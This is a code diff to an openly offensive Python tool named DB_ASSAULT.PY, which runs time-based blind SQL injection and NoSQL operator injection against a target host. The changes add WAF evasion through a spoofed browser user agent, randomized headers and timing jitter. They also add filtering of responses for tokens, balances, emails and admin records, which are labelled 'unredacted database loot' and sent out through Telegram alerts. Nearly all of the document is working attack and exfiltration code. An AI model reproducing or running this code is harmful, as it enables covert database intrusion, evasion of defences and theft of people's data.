@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Time-Based Blind Injection Engine (With Telegram Telemetry)
+DB_ASSAULT.PY v8.5 — Aggressive Database Exploitation & Time-Based Blind Injection Engine (WAF Hardened)
 Features:
-- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors)
-- Boolean and error-based inference checks
-- Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
+- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors) with behavioral timing jitter
+- Boolean and error-based inference checks via WAF-evasive request headers
+- Advanced NoSQL operator injection ($ne, $gt, $where) with record collection and SPA shell filtering
 - Zero-disk live terminal streaming with unredacted red-team evidence output
 - Real-time asynchronous Telegram notification dispatch for unredacted database loot
 """
@@ -16,8 +16,9 @@ import time
 import sys
 from urllib.parse import urlsplit, quote
 
-# Import centralized Telegram broadcaster
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 REQUEST_TIMEOUT = 12
 MAX_RESPONSE_SIZE = 128 * 1024
@@ -51,6 +52,7 @@ def broadcast_tg_alert_sync(loot_type, details):
             pass
 
 def send_http(host, port, path, payload, secure, method="POST"):
+    apply_behavioral_jitter()
     conn = None
     start = time.monotonic()
     try:
@@ -70,11 +72,14 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "NEXUS-OffensiveEngine/8.0",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             "Content-Type": ct,
-            "Accept": "*/*",
+            "Accept": "application/json, text/plain, */*",
+            "Cache-Control": "no-cache",
             "Connection": "close"
         }
+        headers.update(get_randomized_hints())
+        
         conn.request(method, path, body=body, headers=headers)
         res = conn.getresponse()
         data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
@@ -88,7 +93,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             conn.close()
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION [***]", "\033[95m")
+    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION (V8.5) [***]", "\033[95m")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -125,16 +130,29 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         for payload in NOSQL_EXTRACTION_PAYLOADS:
             log(f"  [-] Probing NoSQL [Payload: {json.dumps(payload)}]", "\033[90m")
             res = await asyncio.to_thread(send_http, host, target_port, endpoint, payload, secure)
-            if res["status"] in (200, 201) and len(res["body"]) > 50:
+            
+            body = res["body"]
+            body_lower = body.lower()
+            is_spa_shell = (
+                'div id="root"' in body_lower or 
+                'div id="__next"' in body_lower or
+                (len(body.strip()) < 150 and "user" not in body_lower)
+            )
+            
+            has_data_indicators = any(k in body_lower for k in [
+                "user_id", "token", "balance", "email", "role", "admin", "accounts"
+            ])
+
+            if res["status"] in (200, 201) and not is_spa_shell and (has_data_indicators or len(body) > 200):
                 log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}] (Status: {res['status']})", "\033[92m")
-                log(f"  └── Unredacted Response Excerpt: {res['body'][:300]}", "\033[96m")
+                log(f"  └── Unredacted Response Excerpt: {body[:300]}", "\033[96m")
                 
                 finding = {
                     "vector": "NoSQL Operator Injection",
                     "endpoint": endpoint,
                     "payload": str(payload),
                     "status": res["status"],
-                    "response_sample": res["body"][:500]
+                    "response_sample": body[:500]
                 }
                 findings.append(finding)
                 
